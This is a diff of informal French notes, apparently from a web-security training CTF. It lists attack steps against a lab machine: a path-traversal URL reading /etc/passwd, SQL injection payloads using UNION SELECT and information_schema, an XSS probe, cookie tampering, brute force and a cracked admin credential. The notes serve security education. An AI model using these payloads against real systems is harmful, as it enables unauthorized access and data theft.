@@ -1,37 +1,7 @@
 
-########################## FAIT ##########################
-
-overflow survey tkt
-
-brute force user admin mdp shadow
-
-changer le lien d'insta href
-
-recover password : champ hidden, suppr le hidden et submit qqch en 15char
-
-/robots.txt/.hidden => parcours recursif de l'arborescence
-
-######################## A FAIRE #########################
-
 
 /robots.txt => /whatever => decode md5   ====    /admin => root:qwerty123@
 
 ecrire <script>alert dans le feedback mais je comprends pas pk
 
-http://10.11.249.37/?page=/../../../../../../../etc/passwd
-
-
-cookies ==> tuto pour le declancher : sur mozilla tu f12 puis onglet storage categorie cookies tu change la valeur par b326b5062b2f0e69046810717534cb09
-                                        sur chrome tu fais la meme mais l'onglet s'appel application
-
-######################## A CASSER #########################
-
-curl sur la page albatrose en mode nsa + ft_bornToSec
-
-1=1 UNION all SELECT * FROM users c pas complet mais c deja ca
-1 or 1=1 nous donne du resultat
-je chope le nombre de colones avec => 1 UNION SELECT 1,2 -- j'ai des resultat du coup je sais qu'il y en a 2
-je fais => 1 UNION SELECT 1, table_name FROM information_schema.tables -- et la un max de resultat
-je vais continuer a creuser mais ca sent le rectangle de tissus sur un poto
-
-push pas une image dans un .png
+code dans l'url de la page nsa
